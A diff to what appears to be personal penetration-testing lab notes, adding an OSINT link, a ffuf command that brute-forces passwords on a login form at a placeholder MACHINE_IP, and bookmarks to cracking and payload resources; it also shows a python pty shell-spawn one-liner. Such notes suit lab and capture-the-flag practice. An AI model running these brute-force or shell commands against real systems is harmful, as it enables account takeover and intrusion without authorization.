@@ -1,5 +1,8 @@
 # Info gathering
 
+## OSINT
+https://crt.sh
+
 ### nmap favourite switches
 Syn scan, verbose output:
 ```
@@ -48,6 +51,11 @@ Spawn bash with python:
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
+Password BF example with fuff:
+```
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
+```
+
 ## Windows
 
 Get powershell history:
@@ -65,5 +73,9 @@ wmic service list
 ```
 
 ## Bookmarks
-[Reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+[Reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\
+[Crackstation](https://crackstation.net/)\
+[Subdomain BF tool](https://github.com/aboul3la/Sublist3r)\
+[SecLists - wordlists for all the things](https://github.com/danielmiessler/SecLists)\
+[Payloads all te things - as the name suggests](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
